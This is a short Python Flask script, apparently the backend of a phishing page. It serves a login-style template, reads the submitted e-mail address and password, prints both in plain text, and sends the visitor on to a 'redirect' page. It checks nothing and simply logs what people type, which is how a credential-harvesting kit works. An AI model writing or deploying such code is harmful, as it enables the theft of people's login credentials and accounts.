from flask import Flask, render_template, request

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def ana_sayfa():
    if request.method == 'POST':
        gelen_posta = request.form['DIZ_POSTA']
        gelen_sifre = request.form['DIZ_SIFRE']

        print(f"""
        E-Posta : {gelen_posta}
        Şifre   : {gelen_sifre}
        """)

        return render_template('yonlendir.html')

    return render_template('panel.html')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)